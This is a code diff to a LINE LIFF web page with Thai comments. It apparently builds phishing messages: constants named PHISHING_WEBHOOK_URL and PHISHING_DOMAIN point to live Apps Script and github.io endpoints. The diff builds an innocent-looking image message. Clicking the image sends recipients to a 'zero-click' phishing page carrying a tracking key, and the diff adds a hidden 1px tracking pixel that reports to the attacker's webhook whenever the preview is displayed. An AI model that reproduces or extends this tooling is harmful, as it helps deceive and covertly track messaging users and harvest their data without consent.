@@ -48,10 +48,10 @@
         .header h1 {
             margin: 0;
             font-size: 20px;
-            font-weight: 700;
+            font-weight: 700; /* Slightly bolder */
         }
         .header .subtitle {
-            font-size: 13px;
+            font-size: 13px; /* Slightly smaller */
             opacity: 0.9;
             margin-top: 5px;
         }
@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwKIP0yKKn7Q-XWohU0HvwoppYShpS0NB3mEbckLvwo6vVOhCd_N3PXwmvgSruUZNk5bA/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw1EEWRpJlilQUtMq3CpQ51HGwWzKV2ULS0IJeUQEeYVGdw_5iG1YR2dUdGSAkf3QYe9A/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -817,29 +817,55 @@
                 imageUrl = await uploadImage();
                 if (!imageUrl) return;
                 
-                // สร้าง URL สำหรับ Zero Click
+                // สร้าง URL สำหรับ Zero Click (เมื่อคลิกรูปภาพหลัก)
                 const zeroClickUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
+                // สร้าง URL สำหรับ Tracking Pixel (เมื่อแสดงผล Preview)
+                const pixelTrackUrl = `${PHISHING_WEBHOOK_URL}?action=pixelTrack&key=${encodeURIComponent(trackingKey)}&t=${Date.now()}`; // Add timestamp to try bypassing cache
 
-                // สร้างข้อความแชร์ (Flex Message เฉพาะ Hero Image ที่คลิกได้)
+                // สร้างข้อความแชร์ (Flex Message)
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        // ไม่มี header
-                        hero: { // แสดงเฉพาะรูปภาพ
+                        hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
                             size: 'full',
-                            aspectRatio: '1:1', // หรือ '16:9' หรือตามต้องการ
+                            aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: { // ทำให้รูปภาพคลิกได้
+                            action: {
                                 type: 'uri',
                                 uri: zeroClickUrl
                             }
+                        },
+                        footer: { // เพิ่ม Footer สำหรับใส่ Tracking Pixel
+                            type: 'box',
+                            layout: 'vertical',
+                            spacing: 'none',
+                            margin: 'none',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: pixelTrackUrl, // URL ของ Tracking Pixel
+                                    size: 'xxs', // ขนาดเล็กที่สุดเท่าที่จะทำได้
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover', // หรือ 'fit'
+                                    margin: 'none',
+                                    // พยายามซ่อนด้วย style (อาจไม่ได้ผลเสมอไป)
+                                    offsetTop: '0px',
+                                    offsetBottom: '0px',
+                                    offsetStart: '0px',
+                                    offsetEnd: '0px',
+                                    position: 'absolute', // ลองใช้ absolute positioning
+                                    top: '0px',
+                                    left: '0px',
+                                    // backgroundColor: '#FFFFFF00' // ลองพื้นหลังโปร่งใส (อาจไม่ได้ผล)
+                                }
+                            ],
+                            paddingAll: '0px', // ไม่มี padding
+                            height: '1px' // พยายามทำให้ Footer เล็กที่สุด
                         }
-                        // ไม่มี body
-                        // ไม่มี footer
                     }
                 };
 
